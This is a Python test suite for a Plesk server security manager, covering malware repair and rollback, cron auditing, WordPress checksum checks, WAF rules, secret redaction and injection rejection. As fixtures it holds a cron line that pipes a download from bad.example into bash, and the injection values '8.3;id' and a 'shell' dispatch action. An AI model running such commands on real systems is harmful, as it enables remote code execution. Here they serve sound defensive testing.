"""Isolated management regression tests. No live Plesk/services or cloud calls."""
import hashlib
import importlib.machinery
import importlib.util
import json
import os
import pathlib
import shlex
import tempfile
import time
import unittest
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parents[1]
loader = importlib.machinery.SourceFileLoader('guardian_management_tests', str(ROOT / 'sbin/guardian-manager'))
spec = importlib.util.spec_from_loader(loader.name, loader)
m = importlib.util.module_from_spec(spec)
loader.exec_module(m)


@unittest.skipUnless(os.geteuid() == 0, 'isolated Linux root runner required')
class ManagementTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = pathlib.Path(self.tmp.name)
        self.vhosts = self.base / 'vhosts'
        self.home = self.vhosts / 'example.com'
        self.web = self.home / 'httpdocs'
        self.web.mkdir(parents=True)
        os.chown(self.web, 65534, 65534)
        for attr, value in [('ROOT', self.base / 'guardian'), ('VHOSTS', self.vhosts),
                            ('INCIDENT_LOG', self.base / 'guardian/incidents.jsonl')]:
            patcher = mock.patch.object(m.h, attr, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        patcher = mock.patch.object(m.h, 'plesk_hosting_path', return_value=(str(self.web), str(self.home)))
        patcher.start()
        self.addCleanup(patcher.stop)
        m.prepare()

    def write_site(self, relative, data):
        path = self.web / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        os.chown(path, 65534, 65534)
        return path

    def clean_report(self):
        report = {'id': 'a' * 32, 'domain': 'example.com', 'status': 'finished', 'infected': 0,
                  'epoch': time.time(), 'started_at': m.h.utc_now(), 'findings': []}
        m.h.save_job(report)
        return report

    def malware_report(self, data=b'BAD'):
        self.write_site('index.php', data)
        metadata, fd, _ = m.h.file_metadata(self.web, 'index.php')
        os.close(fd)
        report = {'id': 'b' * 32, 'domain': 'example.com', 'status': 'finished', 'infected': 1,
                  'epoch': time.time(), 'started_at': m.h.utc_now(),
                  'findings': [{'path': 'index.php', 'state': 'found', 'fingerprint': metadata}]}
        m.h.save_job(report)
        return report

    def test_baseline_requires_clean_scan_and_explicit_trust(self):
        self.write_site('index.php', b'GOOD')
        with self.assertRaises(ValueError):
            m.baseline('example.com', True)
        self.clean_report()
        with self.assertRaises(ValueError):
            m.baseline('example.com', False)
        m.baseline('example.com', True)
        self.assertEqual(m.config()['baselines']['example.com']['files'], 1)
        self.assertNotIn('example.com', m.config()['autorepair'])

    def test_cron_audit_reports_suspicious_patterns_without_changing_sources(self):
        cron_root = self.base / 'cron'
        cron_root.mkdir()
        source = cron_root / 'daily-task'
        content = b'#!/bin/sh\n0 * * * * root curl https://bad.example/payload | bash\n'
        source.write_bytes(content)
        outside = cron_root / 'outside'
        outside.write_text('*/5 * * * * root echo safe\n')
        link = cron_root / 'linked-cron'
        link.symlink_to(outside)
        with mock.patch.object(m, 'CRON_FILES', (source,)), \
                mock.patch.object(m, 'CRON_DIRS', (cron_root,)):
            result = m.cron_audit()
        self.assertEqual(result['finding_count'], 1)
        self.assertEqual(result['findings'][0]['rule'], 'remote-shell-pipe')
        self.assertNotIn('bad.example', json.dumps(result))
        self.assertEqual(source.read_bytes(), content)
        self.assertTrue(link.is_symlink())

    def fake_wp_cli(self, message, exit_code):
        temporary = tempfile.TemporaryDirectory(prefix='guardian-wp-cli-test-', dir='/var/lib')
        self.addCleanup(temporary.cleanup)
        folder = pathlib.Path(temporary.name)
        os.chmod(folder, 0o755)
        path = folder / 'wp'
        script = '#!/bin/sh\ncase "$*" in *--insecure*) exit 41;; esac\nprintf "%s\\n" ' + shlex.quote(message) + '\nexit ' + str(exit_code) + '\n'
        path.write_text(script)
        os.chmod(path, 0o755)
        with mock.patch.object(m, 'WP_CLI_PATHS', (str(path),)):
            return m.wordpress_core_checksum_audit('example.com')

    def test_wordpress_core_checksum_audit_uses_unprivileged_cli_without_mutation(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        result = self.fake_wp_cli('Success: WordPress installation verifies against checksums.', 0)
        self.assertEqual(result['status'], 'verified')
        self.assertEqual(result['finding_count'], 0)
        self.assertEqual((self.web / 'wp-load.php').read_bytes(), b'<?php // fixture')

    def test_wordpress_core_checksum_mismatch_is_reported_without_file_content(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        result = self.fake_wp_cli("Warning: File doesn't verify against checksum: wp-admin/admin.php", 1)
        self.assertEqual(result['status'], 'mismatch')
        self.assertEqual(result['findings'], [{'path': 'wp-admin/admin.php',
                                                'rule': 'wordpress-core-checksum-mismatch'}])
        self.assertNotIn('fixture', json.dumps(result))
        events = m.h.incident_list()
        self.assertTrue(any(item['type'] == 'cms_checksum_mismatch' for item in events))

    def test_wordpress_core_checksum_audit_rejects_symlinked_core_paths(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        actual = self.web / 'actual-core'
        actual.mkdir()
        (actual / 'version.php').write_text('<?php $wp_version = "6.8.1";')
        os.chown(actual, 65534, 65534)
        os.chown(actual / 'version.php', 65534, 65534)
        (self.web / 'wp-includes').symlink_to(actual, target_is_directory=True)
        with self.assertRaisesRegex(ValueError, 'Symlinks'):
            m.wordpress_core_checksum_audit('example.com')

    def test_repair_preserves_original_and_rollback_refuses_user_changes(self):
        self.write_site('index.php', b'GOOD')
        os.chmod(self.web / 'index.php', 0o600)
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'GOOD')
        self.assertEqual((self.web / 'index.php').stat().st_mode & 0o777, 0o600)
        finding = m.h.load_job(report['id'])['findings'][0]
        self.assertEqual((m.h.ROOT / 'quarantine' / finding['quarantine_id']).read_bytes(), b'BAD')
        self.write_site('index.php', b'USER_UPDATE')
        with self.assertRaises(ValueError):
            m.repair_rollback(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'USER_UPDATE')
        self.write_site('index.php', b'GOOD')
        m.repair_rollback(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')
        self.assertEqual((m.h.ROOT / 'quarantine' / finding['quarantine_id']).read_bytes(), b'GOOD')

    def test_modified_finding_is_never_replaced(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        self.write_site('index.php', b'USER_UPDATE')
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'USER_UPDATE')

    def test_baseline_tampering_and_unknown_files_are_rejected(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        item = m.config()['baselines']['example.com']
        blob = m.root() / 'baselines' / item['id'] / m.digest(b'GOOD')
        blob.write_bytes(b'TAMPERED')
        report = self.malware_report()
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')

    def test_autorepair_off_by_default_and_enabled_only_for_selected_baseline(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        m.auto_repair(report['id'])
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')
        m.repair_set('example.com', 'on')
        m.auto_repair(report['id'])
        self.assertEqual((self.web / 'index.php').read_bytes(), b'GOOD')

    def test_reputation_consent_private_ips_schema_and_cache(self):
        for ip in ('127.0.0.1', '10.0.0.1', '::1', 'invalid'):
            with self.assertRaises(ValueError):
                m.reputation(ip)
        with self.assertRaises(ValueError):
            m.reputation('8.8.8.8')
        m.cloud_save({'abuseipdb_key': 'a' * 80, 'consent': True})
        with mock.patch.object(m, 'api_json', return_value={'data': {'ipAddress': '8.8.8.8',
                               'abuseConfidenceScore': 42, 'totalReports': 3}}) as fetch:
            self.assertEqual(m.reputation('8.8.8.8')['score'], 42)
            self.assertEqual(m.reputation('8.8.8.8')['score'], 42)
            fetch.assert_called_once()
        with mock.patch.object(m, 'api_json', return_value={'data': {'ipAddress': '1.1.1.2', 'abuseConfidenceScore': 5}}):
            with self.assertRaises(ValueError):
                m.reputation('1.1.1.1')

    def test_ignore_hash_is_domain_scoped_visible_and_reversible(self):
        sha = m.digest(b'known false positive')
        report = self.malware_report(b'known false positive')
        m.ignore_hash_set('example.com', sha, 'add')
        self.assertEqual(m.config()['ignore_hashes']['example.com'], [sha])
        finding = {'path': 'cache.php', 'state': 'found', 'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('example.com', [finding]), 1)
        self.assertTrue(finding['ignored'])
        other = {'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('other.example', [other]), 0)
        self.assertFalse(other['ignored'])
        self.assertIn(sha, m.public_status()['ignore_hashes']['example.com'])
        with self.assertRaises(ValueError):
            m.ignore_hash_set('example.com', 'invalid', 'add')
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        m.ignore_hash_set('example.com', sha, 'remove')
        restored = {'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('example.com', [restored]), 0)
        self.assertFalse(restored['ignored'])
    def test_status_never_contains_provider_secrets(self):
        m.cloud_save({'abuseipdb_key': 'ABUSE_SECRET_12345', 'turnstile_sitekey': 'SITE_KEY_12345',
                      'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'PHP_BASE', self.base / 'missing'):
            output = json.dumps(m.public_status())
        for key in ('ABUSE_SECRET_12345', 'TURNSTILE_SECRET_12345'):
            self.assertNotIn(key, output)
        self.assertEqual(os.stat(m.root() / 'config.json').st_mode & 0o777, 0o600)

    def test_bot_install_preserves_ini_and_refuses_external_prepend(self):
        self.write_site('.user.ini', b'memory_limit=128M\n')
        m.cloud_save({'turnstile_sitekey': 'SITE_KEY_12345', 'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'run', return_value='OK'):
            m.bots_set('example.com', 'on')
            data = (self.web / '.user.ini').read_bytes()
            self.assertIn(b'auto_prepend_file', data)
            self.assertIn(b'memory_limit=128M', data)
            with self.assertRaises(ValueError):
                m.cloud_save({'clear': True, 'consent': False})
            m.bots_set('example.com', 'off')
        self.assertEqual((self.web / '.user.ini').read_bytes(), b'memory_limit=128M\n')
        guard = pathlib.Path(m.config()['bots']['example.com']['guard']).read_text()
        self.assertNotIn('TURNSTILE_SECRET_12345', guard)
        self.assertIn('Guardian disabled', guard)
        self.write_site('.user.ini', b'auto_prepend_file=/external.php\n')
        with self.assertRaises(ValueError):
            m.bots_set('example.com', 'on')

    def test_bot_disable_refuses_changed_ini(self):
        m.cloud_save({'turnstile_sitekey': 'SITE_KEY_12345', 'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'run', return_value='OK'):
            m.bots_set('example.com', 'on')
        self.write_site('.user.ini', b'USER CONFIG')
        with self.assertRaises(ValueError):
            m.bots_set('example.com', 'off')
        self.assertEqual((self.web / '.user.ini').read_bytes(), b'USER CONFIG')

    def test_waf_rules_fixed_ids_limits_and_modes(self):
        rules = m.waf_rules('example.com', 'enforce', 120)
        self.assertIn('deny,status:429', rules)
        self.assertIn('initcol:ip=%{REMOTE_ADDR}', rules)
        self.assertEqual(rules.count('expirevar:'), 1)
        self.assertNotIn('deny', m.waf_rules('example.com', 'detect', 120))
        self.assertEqual(m.waf_rules('example.com', 'off', 120), '')
        for domain, mode, limit in [('../etc', 'detect', 120), ('example.com', 'root', 120), ('example.com', 'detect', 0)]:
            with self.assertRaises(ValueError):
                m.waf_rules(domain, mode, limit)

    def test_php_backup_and_rollback_check_current_hash(self):
        php = self.base / 'php/8.3'
        (php / 'etc').mkdir(parents=True)
        ini = php / 'etc/php.ini'
        ini.write_bytes(b'old config')
        with mock.patch.object(m, 'handler', return_value=php), mock.patch.object(m, 'reload_handler') as reload:
            backup = m.php_backup('8.3')
            ini.write_bytes(b'new config')
            with self.assertRaises(ValueError):
                m.php_restore('8.3', backup['id'], '0' * 64)
            m.php_restore('8.3', backup['id'], m.digest(b'new config'))
            self.assertEqual(ini.read_bytes(), b'old config')
            reload.assert_called_once_with('8.3')

    def test_runtime_failed_reload_restores_original_config(self):
        php = self.base / 'php/8.3'
        (php / 'etc').mkdir(parents=True)
        ini = php / 'etc/php.ini'
        original = (m.BEGIN + 'extension=snuffleupagus.so\n' + m.END).encode()
        ini.write_bytes(original)
        with mock.patch.object(m, 'handler', return_value=php), \
             mock.patch.object(m, 'reload_handler', side_effect=[ValueError('failed'), None]):
            with self.assertRaises(ValueError):
                m.runtime_set('8.3', 'off', m.digest(original))
        self.assertEqual(ini.read_bytes(), original)

    def test_unknown_action_and_shell_injection_rejected(self):
        with self.assertRaises(ValueError):
            m.dispatch({'action': 'shell', 'command': 'id'})
        with self.assertRaises(ValueError):
            m.handler('8.3;id')
        with self.assertRaises(ValueError):
            m.repair_rollback('a' * 32, -1)

    def test_diagnostics_contains_checks_not_keys(self):
        with mock.patch.object(m, 'run', return_value='TEST'), \
             mock.patch.object(m.h, 'fail2ban_status', return_value={}), \
             mock.patch.object(m.h, 'waf_status', return_value={'available': False}), \
             mock.patch.object(m.h, 'monitor_status', return_value=[]):
            result = m.diagnostics('example.com')
        self.assertEqual(len(result['checks']), 6)
        self.assertTrue(all(check['ok'] for check in result['checks']))


if __name__ == '__main__':
    unittest.main()
